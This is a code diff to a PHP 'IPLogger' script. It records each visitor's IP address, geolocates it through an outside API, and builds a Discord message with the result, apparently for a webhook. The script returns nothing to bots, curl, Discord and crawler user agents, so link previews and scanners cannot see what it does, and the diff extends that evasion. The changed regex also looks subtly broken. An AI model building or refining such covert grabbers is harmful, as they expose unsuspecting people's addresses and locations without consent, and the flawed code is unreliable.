@@ -1,14 +1,14 @@
 <?php include("config.php"); ?>
 <?php
 $bd1  = $_SERVER['HTTP_USER_AGENT'];
-if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $bd1)) {
+if(preg_match('/bot|Discord|robot|curl|spider|crawler|amazon|facebook^$/i', $bd1)) {
 die();
 }
 ?>
 <?php
 $IP = $_SERVER['REMOTE_ADDR'];
 $ipapi = json_decode(file_get_contents('http://ip-api.com/json/'.$IP));
-$bandeira = 'https://www.countryflags.io/'.$ipapi->countryCode.'/flat/64.png';
+$bandeira = 'https://flagcdn.com/h240/'.strtolower($ipapi->countryCode).'.png';
 
 $mensagem = json_encode([
     'content' => '**Novo IP**',
@@ -17,6 +17,9 @@ $mensagem = json_encode([
     'embeds' => [
         [
             'title' => 'IPLogger',
+            'thumbnail' => [ 
+              'url' => $bandeira
+            ],
             'type' => 'rich',
             'color' => hexdec("7289DA"),
             'description' => '**IP**
